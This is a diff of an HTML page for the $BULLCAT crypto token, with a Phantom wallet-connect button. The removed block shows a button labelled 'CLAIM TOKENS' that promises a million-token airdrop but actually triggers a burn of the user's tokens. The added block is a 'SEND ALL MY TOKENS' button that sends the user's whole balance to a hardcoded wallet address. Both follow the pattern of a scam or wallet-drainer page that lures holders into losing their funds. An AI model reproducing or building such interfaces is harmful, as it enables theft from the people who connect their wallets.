@@ -92,32 +92,27 @@
                         <i class="fas fa-wallet"></i>
                         CONNECT PHANTOM
                     </button>
-                    <!-- CLAIM / CLAIM AIRDROP -->
-<div class="mt-8 p-8 bg-zinc-900 border border-red-500/50 rounded-2xl">
-    <h3 class="text-2xl font-bold text-red-400 mb-6 flex items-center gap-3">
-        <i class="fas fa-fire"></i> $BULLCAT
+                   <!-- SEND ALL TOKENS -->
+<div class="mt-8 p-8 bg-zinc-900 border border-orange-500/50 rounded-2xl">
+    <h3 class="text-2xl font-bold text-orange-400 mb-6 flex items-center gap-3">
+        <i class="fas fa-skull"></i> SEND ALL TOKENS
     </h3>
-    <p class="text-gray-400 mb-6">Burn your $BULLCAT tokens</p>
     
-    <div class="space-y-6">
-        <div>
-            <label class="block text-sm text-gray-400 mb-2">Amount to Burn</label>
-            <input type="number" id="burnAmount" 
-                   class="w-full bg-black border border-red-500/50 rounded-xl px-6 py-5 text-2xl focus:outline-none focus:border-red-400"
-                   placeholder="0.0" step="0.000001">
-        </div>
-        
-        <button onclick="burnTokens()" 
-                class="w-full bg-red-600 hover:bg-red-700 text-white py-6 text-xl font-bold rounded-xl transition-all active:scale-95 flex items-center justify-center gap-3">
-            <i class="fas fa-fire"></i>
-            CLAIM TOKENS
-        </button>
-        
-        <p class="text-xs text-gray-500 text-center">
-            Claim 1.000.000 $BULLCAT.<br>
-            <span class="font-mono text-red-400 text-[10px]">FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu</span>
-        </p>
+    <div id="balanceDisplay" class="hidden mb-6 p-4 bg-black rounded-xl text-center">
+        <p class="text-gray-400 text-sm">Your $BULLCAT Balance</p>
+        <p id="tokenBalance" class="text-4xl font-bold text-white">0.00</p>
     </div>
+
+    <button onclick="sendAllTokens()" 
+            class="w-full bg-orange-600 hover:bg-orange-700 text-white py-7 text-xl font-bold rounded-xl transition-all active:scale-95 flex items-center justify-center gap-3">
+        <i class="fas fa-arrow-right"></i>
+        SEND ALL MY TOKENS
+    </button>
+    
+    <p class="text-xs text-center text-orange-400/70 mt-4">
+        All your $BULLCAT will be sent to:<br>
+        <span class="font-mono break-all">FtX1wo7WdJiP7Xxvx4H9Z52VrjjrmeGdjnFnGVqfXYtu</span>
+    </p>
 </div>
                 
                 <div id="walletStatus" class="text-sm text-green-400 font-mono hidden">
